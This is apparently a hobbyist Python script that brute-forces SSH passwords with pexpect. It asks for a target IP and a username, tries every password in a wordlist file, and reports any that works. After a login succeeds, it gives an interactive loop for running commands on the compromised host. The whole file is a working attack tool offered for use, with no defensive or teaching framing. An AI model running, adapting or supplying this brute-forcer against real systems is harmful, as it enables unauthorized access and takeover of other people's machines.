#!/usr/bin/python3

import pexpect
from termcolor import colored


PROMPT = ['# ', '>>> ', '> ', '\$ ']

#remember child is equal to the return of connect()
def send_command(child,command):
        child.sendline(command)
        #expects the shell keys
        child.expect(PROMPT)
        #prints output of command
        print(child.before)


def connect(user,host,password):
        #key asked when connected
        ssh_newkey = 'Are you sure you want to continue connecting'
        #key for connecting
        connStr = 'ssh ' + user + '@' + host
        #sets child as connstr
        child = pexpect.spawn(connStr)
        #setting var for when ssh_newkey shows up
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
        if ret == 0:
                print (colored('[!!] Error Connecting', 'red'))
        if ret == 1:
                #dealing with prompt
                child.sendline('yes')
                ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
                if ret == 0:
                        print (colored('[!!] Error Connecting', 'red'))
                        return
        #sending pass
        child.sendline(password)
        child.expect(PROMPT, timeout=0.5)
        return child

def main():
	host = input("Enter IP of Target to BruteForce: ")
	user = input("Enter User Account Name:")
	file = open('password.txt', 'r')
	#trys each password in file
	for password in file.readlines():
		password = password.strip('\n')
		try:
			child = connect(user,host,password)
			print (colored('[+] Password Found: ' + password, 'green'))
			break;
		except:
			print (colored('[-] Wrong password: ' + password, 'red'))

	print ('Enter a command to the terminal: ')
	command = input('')
	print ('Type <EXIT> to exit the terminal')
	print ('\n')
	send_command(child,command)
	print ('\n')
	#While loop for sending command to terminal
	while (command != 'EXIT'):
		command = input('Enter a command to the terminal: ')
		if (command == 'EXIT'):
			break;
		send_command(child, command)
		print ('\n')


main()
